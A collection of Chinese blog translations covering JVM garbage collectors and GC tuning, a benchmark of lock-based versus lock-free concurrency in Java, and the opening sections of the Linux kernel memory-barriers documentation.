在分代收集中，新生代可到达对象图谱的GC根（GC Roots）还包括老生代对新生代的任何引用。这些引用也必须进行处理，以确保在新生代里面所有可到达对象在新生代的回收(minor collection)后任然是存活的。通过使用了“卡表（card table）”识别这些跨代引用。Hotspot 的卡表是一个bytes数组，其中每个字节（byte）用于跟踪的在相应的老生代的512字节区域里可能存在跨代引用，引用被存储在堆里，“store屏障（store barrier）”代码将标记卡表（card table）的卡片来表明在相关的512字节的堆里面从老生代到新生代可能存在的一个潜在引用。  在收集时卡片表（card table）被用于扫描跨代引用，结果作为在新生代中有效的GC根（GC Roots）。因此在新生代收集（minor collections）中一个重要的固定成本是与老生代的大小成正比的。
 
在Hotspot里面新生代有两个幸存区（survivor spaces），交替的扮演“to-space”和“from-space”的角色。在新生代垃圾回收开始时，作为一个新生代回收中复制的目标区域，to-space的幸存区（survivor spaces）通常是空的。from-space的幸存区（survivor spaces）的一个组成部分是上一次新生代回收的目标幸存区（survivor space），和伊甸（Eden）区一样，里面的存活对象都需要复制到目标幸存区。
 
新生代回收的主要消耗就是复制对象到幸存区和年老区（tenured spaces）。在新生代回收中不存在对死亡对象的处理消耗。新生代回收的
 
 工作量直接与存活对象的数量相关，与新生代的大小无关。伊甸（Eden）区的大小每增加一倍，新生代回收的总时间几乎会减少一半。因此，可以在内存和吞吐量中获得平衡。伊甸（Eden）的大小翻倍，每一次收集周期里的收集时间会增加，但是如果需要晋升（promoted）的对象数量和老生代的大小是固定的，那么增加的时间是很少的。
 
注：在Hotspot中新生代是收集会导致暂停应用（stop-the-world events），这在我们的堆越来越大和存活对象越来越多的情况下会是一个很大的问题。我们已经开始看到新生代中使用并发收集来达到减少暂停时间目标的需要。
老生代的收集（Major Collections）：
老生代的收集（Major Collections）是指在老生代（old generation）上的垃圾收集，收集的对象是从年轻代晋升上来的对象。在大多数应用中，绝大部分的程序状态都会在老年代里结束生命周期。在老年代上存在的GC算法也是最多的。有一些是整个空间填满时开始压缩，另一些是回收与应用程序并行，提起防止整个空间填满。
 
老年代的收集器会预测什么时候需要收集，以避免年轻代的晋升失败。收集器跟踪设置在老年代上的阈值，一旦阈值被超过，则开始一次回收。如果这个阈值不能满足晋升需求，则触发一次“FullGC”。一次FullGC将涉及从年轻代上晋升中的所有对象，并且压缩老年代。晋升失败是非常昂贵的操作，因为所有这个周期里的状态和晋升对象都必须回到原来的地方，然后触发FullGC。
 
注：为了避免晋升失败，你需要调整你的填充空间（为晋升失败保留的buffer）），让老年代可以容纳晋升后的对象(‑XX:PromotedPadding=<n>)
 
注：当一次FullGC后堆需要增长 。可以通过将–Xms 和 –Xmx设置为一样的值，来避免在FullGC时的堆调整大小。
 
与FullGC相比，一次对老生代的压缩（compaction）可能是应用程序会经历的最长的暂停应用（stop-the-world）。压缩的时间和在年老区（tenured space）中存活对象的数量成线性增长关系。
 
年老区（tenured space）的填充速率可以通过增加幸存区（survivor spaces）的大小和延长晋升到老年区（tenured space）前的存活时间来减少。但是，由于在新生代收集（Minor collections）中，在幸存区之间的复制成本增加，幸存区（survivor spaces）大小的增加和在延长在晋升之前在新生代收集（Minor collections）(–XX:MaxTenuringThreshold=<n>)的存活时间，也会增加新生代收集（Minor collections）的成本和暂停时间，
串行收集(Serial Collector)
串行收集(Serial Collector)是最简单的收集器，并且对于单处理器的系统也是最好的选择。也是所有收集器里面使用最少的。对于新生代的收集和老生代的收集均使用一个单独的线程。在年老区的对象使用简单的空闲指针（bump-the-pointer）算法(译者：按照这种技术，JVM内部维护一个指针（allocatedTail），它始终指向先前已分配对象的尾部，当新的对象分配请求到来时，只需检查代中剩余空间（从allocatedTail到代尾geneTail）是否足以容纳该对象，并在“是”的情况下更新allocatedTail指针并初始化对象。下面的伪代码具体展示了从连续内存块中分配对象时分配操作的简洁性和高效性)即可。当老年代填满后会触发老年代收集。
并行收集（Parallel Collector）
并行收集器有两种形式。一种是并行收集器（-XX：+ UseParallelGC），它在新生代的收集中使用多线程来执行，在老生代的收集中使用单线程执行。另一种是从java 7U4开始默认使用并行老生代收集器（Parallel Old collector ）(‑XX:+UseParallelOldGC)，它在新生代的收集和老生代的收集均使用多线程。在年老区的对象使用简单的空闲指针（bump-the-pointer）算法即可。当老生代填满后会触发老生代收集。
 
在多处理器系统上并行老生代收集器（Parallel Old collector ）在所有收集器中有最大吞吐量。只有收集开始时它才会影响到正在运行的程序，然后使用的最有效的算法并行的多个线程的收集。这使得并行老生代收集器（Parallel Old collector ）非常适合批处理应用。
 
剩余存活的对象的数量比堆的大小对收集老生代的成本影响更大。因此可以通过使用更大的内存和接受暂停的时间更长但是次数更少来提高并行老生代收集器（Parallel Old collector）的效率，以提供更大的吞吐量。
 
因为对象晋升到老年区是一个简单的空闲指针（bump-the-pointer）和复制操作，可以预期这个对新生代的收集是最快的。
 
对于服务性应用程序来说，并行老生代收集器（Parallel Old collector ）必须首先保持对端口的调用。如果老年代的收集暂停超过了你应用程序的容忍，你需要考虑使用可以与应用程序并发执行的并发收集器来收集老生代的对象，
 
注：基于现代的硬件，对老生代的压缩每GB的存活对象预计需要暂停一到五秒。
 
注：在多插槽CPU的服务器应用程序中使用-XX：+ UseNUMA  并行收集器有时能获得更好的性能，它的伊甸区（Eden）的分配是在线程本地的CPU插槽上，可惜的这个功能是不提供给其他收集器。
并发标记清理收集器（ Concurrent Mark Sweep (CMS) ）
CMS（-XX：+ UseConcMarkSweepGC）收集器在老生代中使用，收集那些在老生代收集中不可能再到达的年老对象。它与应用程序并发的运行，在老生代中保持一直有足够的空间以保证不会发生晋升失败。
 
晋升失败将会触发一次FullGC，CMS按照下面多个步骤处理：
1、初始标记：寻找GC根对象;
2、并发标记：标记所有从GC根开始可到达的对象;
3、并发预清理：检查被更新过的对象引用和在并发标记阶段晋升的对象。
4、重新标记：捕捉预清洁阶段以来已更新的对象引用。
5、并发清理：通过回收被死对象占用的内存更新可用空间列表。
6、并发重置：重置数据结构为下一次运行做准备。
 
当年老对象变成不可到达，占用空间被CMS回收并且放入到空闲空间列表中。当晋升发生的时候，会查询空闲空间列表，为晋升对象找到适合的空间。这增加了晋升的成本，从而相比并行收集器也增加了新生代收集的成本。
 
 注：CMS 不是压缩收集器，随着时间的推移在老生代中会导致碎片。对象晋升可能失败，因为一个大的对象可能在老生代在找不到一个可用空间。当发生这样事件后，会记录一条“晋升失败”的消息，并且触发一次FullGC来压缩存活的年老对象。对于这种压缩驱动的FullGCs，可以预计相比在老生代中使用并行老生代收集器（Parallel Old collector ）暂停的时间为更长，因为CMS使用单线程压缩。
  
CMS尽可能的与应用程序并发运行，它具有许多含义。首先，由于收集器会占用CPU的时间，因此CPU可用于应用程序的时间减少。CMS消耗的时间量与晋升到老年区的对象数量呈线性关系。第二、对于并发GC周期中的某些阶段，所有的应用线程必须到达一个安全点，比如标记GC根和执行并行的重新标记检查更新。
 
注：如果一个应用程序年老区的对象发生非常明显的变化，重新标记阶段将是非常耗时的，在极端情况下，它可能比一个完整的并行老生代收集器（Parallel Old collector）的压缩时间还要长。
 
CMS通过降低吞吐量、更费时的新生代的收集，更大的空间占用，来降低FullGC的频率。 根据不同的晋升率，与并行收集（Parallel Collector）相比吞吐量减少10%-40%。CMS也要求多于20%的空间来存放额外的数据结构和“漂浮垃圾（floating garbage）”，漂浮垃圾是值在并发标记阶段丢掉的，到下一个收集周期处理的对象。
 
高晋升率和由此产生的碎片，可以通过增加新生代和老生代空间的大小来降低。
 
注：当CMS收集的空间不能满足晋升的时候，它可能遇到“并发模式失败”，在日志中可以找到记录。产生这种情况的一个原因是收集的太迟了，这样可以通过调整策略来解决。另外的原因是收集的空间空闲率跟不上高的晋升率或则某些应用高的对象更新率。如果你的应用的晋升率和更新率太高，你可能需要改变你的应用程序来减少晋升的压力。使用更多的内存有时候可能会使得情况更糟，因为CMS需要扫描更多的内存。
Garbage First (G1) 收集器
G1 (-XX:+UseG1GC)收集器是一个在java 6中使用新的收集器，现在从java 7U4开始正式支持。它是一个部分并发的收集算法，它会尝试通过小步增量暂停世界的方式压缩老年区，来努力最小化FullGC，而因为碎片引起的FullGC正是CMS的一个噩梦。G1也是分代收集器，但是它与其他收集器器使用不同的堆组织方式，它根据不同的用途，它将堆分为大量（(~2000)）固定大小的区（regions），相同用途的堆也是不连续的（译者：Java堆的内存布局与就与其他收集器有很大差别，它将整个Java堆划分为多个大小相等的独立区域（Region），虽然还保留有新生代和老年代的概念，但新生代和老年代不再是物理隔离的了，它们都是一部分Region（不需要连续）的集合）。
 
 G1采用并发的标记区域的方式来跟踪区域之间的引用，并且只关注收集能收集到最大空闲区的区域（译者：G1跟踪各个Region里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，每次根据允许的收集时间，优先回价值最大的Region（这也就是Garbage-First名称的来由））。这些区域的收集是暂停程序的方式，增量的将存活的对象复制到一个空的区域里面，从而收集的过程是压缩的。在同一个周期里收集的区域叫做收集组（Collection Set）
 
如果一个对象大小超过了区域大小的50%，那么它会被分配到一个大区域里面，可能是当前区域大小的几倍。在G1下，收集和分配大对象是非常昂贵的操作，目前还没有任何优化措施。
 
任何压缩收集器所面临的挑战不是移动对象，而是对这些对象的引用更新。如果一个对象被许多区域引用，那么更新这些引用会比移动对象更加耗时。G1通过“记忆集（Remembered Sets）” 跟踪区域中的那些有来自其他区域引用的对象。记忆集（Remembered Sets）是一些卡片的集合，这些卡片上标记着更新信息。如果记忆集（Remembered Sets）变大，那么G1久明显变慢了。当从一个区域转移对象到另外区域的时候，那么对应暂停时间的长度与需要扫面和更新引用的区域的数量成正比。
 
维护记忆集（Remembered Sets）会增加新生代收集的成本，导致比并行老生代收集器（Parallel Old collector）和CMS收集器对新生代的收集时暂停更长的时间。
 
G1是目标驱动性，通过–XX:MaxGCPauseMillis=<n>设置延迟时间，默认是200ms，该目标将影响在每个周期做的工作量，也是竭尽所能要保证的唯一依据。设置目标在几十毫秒大多是徒劳的，并且几十毫秒的目标也不是G1的关注点。
 
当一个应用程序可以容忍0.5-1.0秒的暂停来增量压缩，G1是对于拥有一个大堆，并且会逐渐碎片化的场景来说是很好的通用的收集器。G1 倾向于降低在最环情况下暂停的频率，而正是CMS的问题，为了处理产生碎片而扩展了新生代收集和对老生代增量压缩。大部分的暂停被限制在一个区域而不是整个堆的压缩。
 
与CMS一样，G1也会因为无法保证晋升率而失败，最终回到暂停程序的FullGC上。就像CMS“并发模式失败”一样，G1也可能遭受转移失败，在日志中能看到“目标空间溢出（to-space overflow）”。这种情况发生在对象转移的区域没有足够的空闲空间的时候，与晋升失败类似。如果发生这种情况，请尝试使用更大的堆，更多标记线程，但在某些情况下，需要应用程序作出改变，以减少分配比率。
 
 对G1来说一个具有挑战性的问题是处理高关注率的对象和区域。 当区域里存活的对象没有被其他区域大量引用。增量停止世界的压缩方法效果很好。如果一个对象或者区域是被大量引用的，记忆集（Remembered Sets）将会相应变大。并且G1将会避免收集这些对象。最终，不得不导致频繁的中等长度的暂停时间来压缩堆。
其他并发收集器（Alternative Concurrent Collectors）
CMS 和 G1通常认为是最并发的收集器，但是当你观察整个工作过程，很显然新生代，晋升、甚至许多老生代的工作都不是并发的。对于老生代来说CMS是最并发的算法，G1更像是暂停程序的增量收集器。CMS和G1都会有明显的和有规律的暂停应用的事件发生，并且最坏情况下往往使他们不适合严格的低延迟应用，如金融交易或交互型的用户界面。
 
其他的收集器如：Oracle的JRockit Real Time，IBM WebSphere的Real Time的，和Azul 的Zing。 JRockit和Websphere的收集器在延迟上比CMS和G1更加有优势，但是在大多数情况下它们有吞吐量的限制，并且仍然遭受明显的暂停应用的事件。Zing是本作者知道的唯一一款Java收集器，能对所有代都真正并发收集和压缩，同时保持了高吞吐率。Zing确实有一些亚毫秒级的暂停程序的事件，但这些是在收集周期的相移，并且与存活对象集的大小无关。
 
JRockit的RT在控制堆的大小，有高的对象分配率的时候可以实现暂停时间在几十毫秒，但是偶尔会失败而回到完全压缩暂停。WEBSPHERE RT通过约束的分配比率和存活集的大小，可以实现毫秒级别的暂停时间。Zing在高分配率时通过在所有阶段并发，能达到亚毫秒级的暂停。无论堆大小，Zing是能够保持一致的行为，并且允许用户按照需要使用更大的堆，来保证应用程序的吞吐量，或则对象模型状态的需求，而不用担心增加暂停时间。
 
对于所有的并发收集器来说关注延迟目标，你就必须放弃一些吞吐量和空间。根据并发收集器的效率，你可能放弃一点点的吞吐量，但是通常你总是需要显著增加空间。如果真正的并发，暂停程序的事件将很少发生，那么需要更多的CPU内核来支持并发操作和维持吞吐量。
 
注：所有的并发收集器当有足够的空间时候，往往能更有效地分配对象。根据经验，为了能高效的操作，你应该预算至少两到三倍于存活集的大小。然而，维持并发操作所需的空间随着应用程序的吞吐量，以及相关的对象分配和晋升率的增长而增长。因此，对于高吞吐量的应用，维持较高的堆大小堆存活对象的比例非常有必要。鉴于目前系统拥有的巨大的内存空间，这对于服务器并不是什么问题。
垃圾收集监控和调整（Garbage Collection Monitoring & Tuning）
为了理解你的应用程序和垃圾收集是如何工作的，启动JVM的时间至少需要添加如下参数：
 
-verbose:gc
-Xloggc:
-XX:+PrintGCDetails
-XX:+PrintGCDateStamps
-XX:+PrintTenuringDistribution
-XX:+PrintGCApplicationConcurrentTime
-XX:+PrintGCApplicationStoppedTime
然后加载日志到像Chewiebug的工具进行分析。
 
为了看到动态的GC过程，可以使用JVisualVM并且安装Visual GC插件。这将使你能看到你的应用程序的GC行为。
 
为了能获得一个适合你应用的GC需要，你需要一个有代表性的可以重复执行的负载测试。当你掌握每个收集器是如何工作的，根据不同的配置运行负载测试，直到达到你理想的吞吐量和延迟目标。从最终用户的角度来看，重要的是要测量延迟。可以通过捕获每个测试请求的响应时间，并且使用直方图来记录结果， 如HDR直方图（HdrHistogram）或干扰物直方图（Disruptor Histogram）。如果有延迟尖峰超出可接受范围，然后尝试关联GC日志来判断是否是GC问题。它是可能是其他问题导致的延迟高峰。另一种有用的工具是
jHiccup，它可以用来跟踪在JVM中暂停，并且可以整合多个系系统到一个整体。使用jHiccup测量你的空闲系统几个小时，通常情况你会得到一个令人惊讶的结果。
 
如果延迟尖峰是由于GC导致，那么可以关注在调整CMS或G1看是否可满足的延迟目标。有时这是不可能的，因为高分配和晋升率与低时延的要求是冲突的。 GC优化是一个需要高度技巧的工作，往往需要修改应用程序，以减少对象分配或对象生存期。如果需要在时间、GC优化和应用程序的修改，精通方面权衡，那么购买商业并发压缩的JVMs，比如JRockit Real Time 和 Azul Zing可能也是必需的。 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
基于锁的并发算法 vs 无锁的并发算法, caoyaojun1988-163-com.iteye.com.blog.1960078, Thu, 17 Oct 2013 17:55:39 +0800

文本通过实例比较了各种基于锁的并发算法和无锁并发算法的性能：系 http://mechanical-sympathy.blogspot.com/2013/08/lock-based-vs-lock-free-concurrent.html  文翻译
 
      上周在由Heinz Kabutz通过JCrete 组织的开放空间会议(unconference)上，我参加一个新的java规范 JSR166 StampedLock的审查会议。StampedLock 是为了解决多个readers 并发访问共享状态时，系统出现的地址竞争问题。在设计上通过使用乐观的读操作，StampedLock 比ReentrantReadWriteLock 更加高效；
 
      在会议期间，我突然意思到两点：第一、我想是时候该去回顾java中锁的实现的现状；第二、虽然StampedLock 看上去是JDK很好的补充，但是它视乎忽略了一个事实，即在多个reader的场景里，无锁的算法通常是更好的解决方案。
 测试：
      为了比较不同的实现方式，我需要采用一种不偏向任意一方的API测试用例。 比如：API必须不产生垃圾、并且允许方法是原子性的。一个简单的测试用例是设计一个可在两维空间中移动其位置的太空船，它位置的坐标可以原子性的读取；每一次事物里至少需要读写2个域，这使得并发变得非常有趣；
  
/**
 * 并发接口，表示太空船可以在2维的空间中移动位置;并且同时更新读取位置
 */
public interface Spaceship
{
    /**
     *  读取太空船的位置到参数数组 coordinates 中
     *
     * @param coordinates 保存读取到的XY坐标.
     * @return 当前的状态
     */
    int readPosition(final int[] coordinates);
 
    /**
     *  通过增加XY的值表示移动太空船的位置。
     *
     * @param xDelta x坐标轴上移动的增量.
     * @param yDelta y坐标轴上移动的增量.
     * @return the number of attempts made to write the new coordinates.
     */
    int move(final int xDelta, final int yDelta);
}
 
      上面的API通过分解一个不变的位置对象，本身是干净的 。但是我想保证它不产生垃圾，并且需要能最直接的更新多个内容域。这个API可以很容易地扩展到三维空间，并实现原子性要求。
 
      为每一个飞船都设置多个实现，并且作为一个测试套件。本文中所有的代码和结果都可以在这里找到。
 
      该测试套件会依次运行每一种实现.并且使用 megamorphic dispatch模式，防止并发访问中的方法内联(inlining)，锁粗化(lock-coarsening)，循环展开( loop unrolling)的问题;
 
       每种实现都执行下面4个不同的线程的情况，结果也是不同的;
      1 reader - 1 writer
      2 readers - 1 writer
      3 readers - 1 writer
      2 readers - 2 writers
 
      所有的测试运行在64位机器、Java版本：1.7.0_25、 Linux版本：3.6.30、4核 2.2GHz Ivy Bridge （第三代Core i系列处理器）i7-3632QM的环境上。
 
      测试吞吐量的时候，是通过每一种实现都重复测试超过5次，每一次都运行5秒以上，以保证系统足够预热，下面的结果都是第5次之后平均每秒吞吐量。为了更像一个典型的java应用;没有采用会导致明显减少差异的线程依附性（thread affinity）和多核隔离（core isolation ）技术;
结果：
    
      上述图表的原始数据可以在这里找到
分析：
      结果里面真正令我吃惊的是ReentrantReadWriteLock的性能，我没有想到的是，在这样的场景下它在读和少量写之间取得的巨大的平衡性，
 
      我主要的收获：
      1、StampedLock 对现存的锁实现有巨大的改进，特别是在读线程越来越多的场景下：
      2、StampedLock有一个复杂的API，对于加锁操作，很容易误用其他方法;
      3、当只有2个竞争者的时候，Synchronised是一个很好的通用的锁实现;
      4、当线程增长能够预估，ReentrantLock是一个很好的通用的锁实现;
      5、选择使用ReentrantReadWriteLock时，必须经过小心的适度的测试 ;所有重大的决定，必须在基于测试数据的基础上做决定;
      6、无锁的实现比基于锁的算法有更好短吞吐量;
 
结论：
      非常开心能看到无锁技术对基于锁的算法的影响; 乐观锁的策略，实际上就是一个无锁算法技术。
      以我的经验看，教学和开发中的无锁算法，不仅能显著改善吞吐量;同时他们也提供更低的延迟。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Linux内核的内存屏障, caoyaojun1988-163-com.iteye.com.blog.1886320, Thu, 13 Jun 2013 18:54:08 +0800

文本详细介绍了linux 内存屏障的知识：系 https://www.kernel.org/doc/Documentation/memory-barriers.txt 文翻译
============================
Linux内核的内存屏障============================
By: David Howells <dhowells@redhat.com>
    Paul E. McKenney <paulmck@linux.vnet.ibm.com>
 内容：
 （*）抽象内存访问模型。
      - 设备操作。      - 什么是确保的。
 （*）什么是内存屏障？
      - 内存屏障的种类。      - 什么是内存屏障不能确保的？      - 数据依赖屏障。      - 控制依赖。      - SMP屏障配对。      - 内存屏障顺序的例子。      - read内存屏障 与 load预取。      - 传递性
 （*）显式内核屏障。
      - 编译屏障。      - CPU内存屏障。      - MMIO写屏障。
 （*）隐式内核内存屏障。
      - 锁（Locking ）功能。      - 中断（Interrupt ）禁用功能。      - 休眠（Sleep ）和唤醒（wake-up）功能。      - 其他功能。
 （*）CPU之间锁屏障效应。
      - 锁与内存访问。      - 锁与I / O访问。
 （*）何时需要内存障碍？
      - 多处理器之间的交互。      - 原子操作。      - 设备访问。      - 中断。
 （*）内核的I / O屏障效应。
 （*）最小执行顺序的假想模型。
 （*）CPU缓存的作用。
      - 缓存的一致性。      - 缓存的一致性与DMA。      - 缓存的一致性与MMIO。
 （*）CPU能做到的
      -  Alpha CPU。
 （*）使用示例。
      - 循环缓冲区。
 （*）引用
============================抽象内存访问模型============================
考虑下面的抽象系统模型：
 
                                                        图1
       每一个CPU执行一个有内存访问操作的程序。在这个抽象的CPU中，内存操作的顺序是非常简单的。但是实际上CPU在维护因果关系的前提下，可能以它喜欢的任何顺序执行内存操作。同样，编译器也可以按照它喜欢的任何顺序生成指令，只要它不影响到程序的真正意图。
       因此，在上图中一个CPU执行内存操作的影响，要通过CPU和系统其他部分之间的接口（虚线），才能被系统其他部分感知。
       例如，请考虑以下的事件序列：
     
       访问集在内存系统中可能出现下面24种不同的组合：
 
         因此，可能产生四种不同值组合的结果：
	x == 1, y == 2
	x == 1, y == 4
	x == 3, y == 2
	x == 3, y == 4
       此外，一个CPU 提交stores 指令到存储系统，另外一个CPU执行load指令时，并不能保证能正确感知到stores和load指令提交的顺序。  
       作为进一步的例子，考虑下面的事情顺序：
          CPU 1		CPU 2
	===============	===============
	{ A == 1, B == 2, C = 3, P == &A, Q == &C }
	B = 4;		Q = P;
	P = &B		D = *Q;
       这里有一个明显的数据依赖，D的值取决于由CPU 2对P赋的地址的值。执行结束时，可能是下面任何一个结果；
	(Q == &A) and (D == 1)
	(Q == &B) and (D == 2)
	(Q == &B) and (D == 4)
       注意：CPU 2永远不会将C的值赋值给D，因为CPU在执行*Q之前一定会执行将P的值赋值给Q；
设备操作-----------------
        目前有些设备的控制接口，是映射到内存空间上一组地址。这些控制寄存器的访问顺序是非常重要的。例如，考虑拥有一系列内部寄存器的以太网卡，它通过一个地址端口寄存器（A）和一个数据端口寄存器（D）访问。现在要读取编号为5的内部寄存器，假设实现代码如下：
	*A = 5;
	x = *D;
 
       实际运行时可能是下面的两个序列之一：
	STORE *A = 5, x = LOAD *D
 	x = LOAD *D, STORE *A = 5
       其中第二个肯定会导致故障，因为它设置值在读取寄存器的地址之后。
担保----------
下面是CPU必须要保证的最小集合：
 （*）任何给定的CPU，依赖的内存访问必须在自己内部是有序的。这意味着对于
	Q = P; D = *Q;
         CPU执行的内存操作顺序：
	Q = LOAD P, D = LOAD *Q
         并且总是相同的顺序。
 （*）一个特定的CPU内，交叉的加载（loads）和存储（store）指令必须是有序的。这意味着对于：
	a = *X; *X = b;
         CPU的内存操只能出现下面的顺序：
	a = LOAD *X, STORE *X = b
        对于：
	*X = c; d = *X;
          CPU的内存操只能出现下面的顺序：
	STORE *X = c, d = LOAD *X
     （如果它们的目标内存片段是重叠的，称为加载（load）和存储(store)交叉）。
  下面是必须要确保的和一定不能确保的：
 （*）独立的加载（load）和存储（store）一定不能确保特定的顺序，这意味着对于：
	X = *A; Y = *B; *D = Z;
     我们可能得到下面的序列之一：
	X = LOAD *A,  Y = LOAD *B,  STORE *D = Z
	X = LOAD *A,  STORE *D = Z, Y = LOAD *B
	Y = LOAD *B,  X = LOAD *A,  STORE *D = Z
	Y = LOAD *B,  STORE *D = Z, X = LOAD *A
	STORE *D = Z, X = LOAD *A,  Y = LOAD *B
	STORE *D = Z, Y = LOAD *B,  X = LOAD *A
（*）必须要确保是重复的内存访问可以被合并或者取消，这意味着对于
	X = *A; Y = *(A + 4);
     我们可能得到下面的序列之一：
	X = LOAD *A; Y = LOAD *(A + 4);
	Y = LOAD *(A + 4); X = LOAD *A;
	{X, Y} = LOAD {*A, *(A + 4) };
     对于：
	*A = X; Y = *A;
     我们可能会得到下面的序列之一：
	STORE *A = X; Y = LOAD *A;
	STORE *A = Y = X;
=========================什么是内存屏障？=========================
       如上所述，独立的存储操作以随机的顺序执行，但是对于CPU与CPU的交互和I / O来说会产生问题，我们需要某种方式来干预编译器和CPU的执行顺序。
       内存屏障就是这样一种干预手段。它们通过在一侧设置屏障来保证内存操作的局部顺序。
       如此强制的手段是有必要的，因为在一个系统中CPU和其他设备可以使用各种技巧来提高性能，包括内存操作的重排、延迟加载和合并；预取；推测执行分支和各种类型的缓存。使用内存屏障来禁用或抑制这些技巧，使代码稳健的控制多个CPU和(或)设备之间的交互。
内存屏障类型---------------------------
内存屏障的四个种基本类型：
 （1）写（write）（或存储（store））内存屏障。
     写内存屏障保证所有在指定的屏障之前的存储（store）操作一定在所有在指定屏障之后的存储（store）操作之前执行。
     写屏障仅仅保证存储（store）指令的局部顺序，不对加载（load）指令有任何影响。
     一个CPU可以被视为随着时间的推移顺序提交存储操作（store）给内存系统。在序列中所有在写屏障之前的存储（store）指令一定在所有在写屏障之后存储（store）指令之前执行。
     [！]请注意，写障碍一般与读屏障或数据依赖障碍搭配使用，请参阅，“SMP屏障配对”章节。
 （2）数据依赖屏障。
     数据依赖屏障是读屏障的一种较弱形式。在两个load指令执行的情况下，第二个依赖于第一个的执行结果（例如：第一个load执行获取某个地址，第二个load指令取该地址的值），数据依赖屏障会确保第二个load指令在获取目标地址的值的时候，第一个load指令一定以及更新过该地址。     数据依赖屏障仅仅保证相互依赖的load指令的局部顺序，不对stores指令，独立的load指令或者交叉的load指令有影响！
     如（1）中提到的，系统中的其它CPU可以被看作能够感知该CPU提交到内存系统的存储（store）指令顺序。由该CPU发出的数据依赖屏障可以确保任何在该屏障之前的load指令，如果该load指令的目标被另一个CPU的存储（store）指令修改，在屏障执行完成之后，所有在该load指令对应的store指令之前的store指令的更新都会被所有在数据依赖屏障之后的load指令感知。
    请参阅“内存屏障顺序实例”涨价展示的时序图。
    [！]注意：第一个load指令必须是真正数据依赖，而不是控制依赖。如果第二个load指令的目标地址依赖于第一个load，但是这个依赖实际上时依赖一个条件而不是加载的地址本身，那么它是一个控制依赖， 需要一个完整的读屏障或更强的屏障。查看“控制依赖”章节，了解更多信息。
     [！]注意：数据依赖屏障一般与写障碍成对出现；看到“SMP屏障配对”章节。
 （3）读（或load）内存屏障。
     读屏障是数据依赖屏障，并且能确保所有在读屏障之前的load操作一定在所有在读屏障之后的load操作之前执行并让其他系统组件感知。
     读屏障仅仅只是保证load指令的部分顺序，不对store指令有任何影响。
     读屏障包含数据依赖屏障，因此可以替代他们。
     [！]注意：读屏障通常与写屏障成对出现;请参阅“SMP屏障配对”章节。
 （4）通用内存屏障。
     通用屏障能确保所有在屏障之前的load和store操作一定在所有在屏障之后的load和store操作之前执行并让其他系统组件感知。
     通用屏障能保证load和store指令的部分顺序。
     通用屏障包含了读屏障和写屏障，所以可以替代他们两者。
一对隐含的类型：
 （5）锁（LOCK）操作。
     它可以看着是一个单向渗透的屏障。它保证所有在LOCK之后的内存操作一定在锁操作后会发生，并且系统中的其他组件可感知。
     在LOCK操作之前内存操作可能会在LOCK 完成之后发生。
     锁操作几乎总是与解锁操作成对出现。
 （6）解锁（UNLOCK）操作。
     这也是一个单向渗透屏障。它保证所有解锁（UNLOCK）操作之前的内存操作一定在解锁（UNLOCK）操作之前发生，并且系统中的其他组件可感知。
     在解锁操作之后的内存操作可能会出现解锁UNLOCK发生之前完成。
     锁（LOCK）和解锁（UNLOCK）操作各自保证自己对指令的严格顺序。
     使用锁和解锁操作，一般不需要使用其他种类的内存屏障（但要注意在“MMIO写屏障”一节中提到的例外）。
仅仅在两个CPU之间或者CPU和其他设备有交互的时候才需要屏障。如果可以确保代码中不会有任何这种交互，那么这段代码是不需要使用内存屏障。
注意：这些是都最低限度的保证。不同的架构可能会提供更多的保证，但是他们不是必须的，不能依赖其写代码。
内存屏障不能确保的事情：----------------------------------------------
有一些事情，Linux内核的内存屏障并不保证：
 （*）不能保证，任何在内存屏障之前的内存访问操作在内存屏障指令执行完成后也执行完成，内存屏障相当于在CPU的访问队列中画一条线，相关的访问请求不能交叉。
 （*）不能保证，在一个CPU发出的内存屏障会对另一个CPU或系统其他硬件有任何直接影响。只会间接影响到第二个CPU看到第一个CPU的访问效果的顺序，但请看下一条：
 （*）不能保证，一个CPU从第二个CPU的访问中得到的正确顺序，即便第二个CPU使用了内存屏障，除非第一个CPU同样使用匹配的内存屏障（见款SMP屏障配对“）。
 （*）不能保证，一些CPU相关的硬件[*]不会对内存访问重排序。 CPU缓存的一致性机制会在多个CPU之间传播内存屏障的间接影响。并且可能不是有序的。
[*]总线主控DMA和一致性的信息，请查阅：
Documentation/PCI/pci.txtDocumentation/PCI/PCI-DMA-mapping.txtDocumentation/DMA-API.txt
 
数据依赖屏障
------------------------
数据依赖屏障的使用条件有点微妙，并且不是很明确。为了说明问题，考虑下面的事件序列：
	CPU 1		CPU 2
	===============	===============
	{ A == 1, B == 2, C = 3, P == &A, Q == &C }
	B = 4;
	<write barrier>
	P = &B
			Q = P;
			D = *Q;
这里很明显存在数据依赖，执行结束后Q必须是＆A或则＆B，并且：
	(Q == &A) 意味着 (D == 1)
	(Q == &B) 意味着 (D == 4)
但是 CPU 2可能先感知到P更新，然后感知到B更新，从而导致以下情况：
	(Q == &B) and (D == 2) ????
虽然这可能看起来像是一致性或因果关系维护失败，事实并不如此，这种行为在一些真正的CPU也可以观察到（如DEC Alpha）。
为了处理这个问题，数据依赖屏障或更强的屏障必须插入到地址load和数据load之间：
	CPU 1		CPU 2
	===============	===============
	{ A == 1, B == 2, C = 3, P == &A, Q == &C }
	B = 4;
	<write barrier>
	P = &B
			Q = P;
			<data dependency barrier>
			D = *Q;
 这将强制结果是前两种之一，防止第三种可能性。
[！]注意：这种看上去非常违反常理的情况，在有多个独立缓存的系统中是非常常见的。比如：当一个缓存处理偶数编号的缓存行，另外一个缓存处理奇数编号的缓存行。指针P可能被存储在奇数编号的缓存行，变量B可能被存储在偶数编号的缓存行中。然后，如果在读取CPU缓存的时候，偶数编号的缓存非常繁忙，而奇数编号的缓存处于闲置状态，就会出现指针P（&B）是新值，但变量B（2）是旧值。
另外一个需要数据依赖屏障的例子是从内存中读取一个数字，然后用来计算一个数组的下标； 
	CPU 1		CPU 2
	===============	===============
	{ M[0] == 1, M[1] == 2, M[3] = 3, P == 0, Q == 3 }
	M[1] = 4;
	<write barrier>
	P = 1
			Q = P;
			<data dependency barrier>
			D = M[Q];
数据依赖屏障对RCU系统是很重要的，例如。在include / linux / rcupdate.h的rcu_dereference（）函数。这个函数允许RCU的指针被替换为一个新的值，而这个新的值还没有完全的初始化。
更多例子参见“高速缓存一致性”章节。
